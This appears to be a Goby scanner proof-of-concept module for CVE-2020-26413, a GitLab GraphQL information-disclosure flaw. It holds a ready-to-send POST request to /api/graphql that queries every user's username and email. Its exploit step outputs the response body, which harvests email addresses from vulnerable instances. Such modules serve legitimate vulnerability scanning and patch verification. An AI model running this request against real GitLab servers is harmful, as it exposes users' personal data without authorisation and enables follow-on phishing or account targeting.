{
      "Name": "GitLab Graphql Email information disclosure CVE-2020-26413 gitlab",
      "Level": "1",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "app=\"GitLab\"",
      "Description": "GitLab is The DevOps Platform.",
      "Product": "GitLab",
      "Homepage": "https://about.gitlab.com/",
      "Author": "",
      "Impact": "An issue has been discovered in GitLab CE/EE affecting all versions starting from 13.4 before 13.6.2. Information disclosure via GraphQL results in user email being unexpectedly visible.",
      "Recommendation": "",
      "References": [
            "https://gitlab.com/gitlab-org/gitlab/-/issues/244275",
            "https://gitlab.com/gitlab-org/cves/-/blob/master/2020/CVE-2020-26413.json",
            "https://nvd.nist.gov/vuln/detail/CVE-2020-26413"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/api/graphql",
                        "follow_redirect": true,
                        "header": {
                              "Content-Type": "application/json"
                        },
                        "data_type": "text",
                        "data": "{\"query\":\"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }\",\"variables\":null,\"operationName\":null}"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "username",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "email",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "@",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/api/graphql",
                        "follow_redirect": true,
                        "header": {
                              "Content-Type": "application/json"
                        },
                        "data_type": "text",
                        "data": "{\"query\":\"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }\",\"variables\":null,\"operationName\":null}"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "username",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "email",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "@",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|undefined|undefined"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}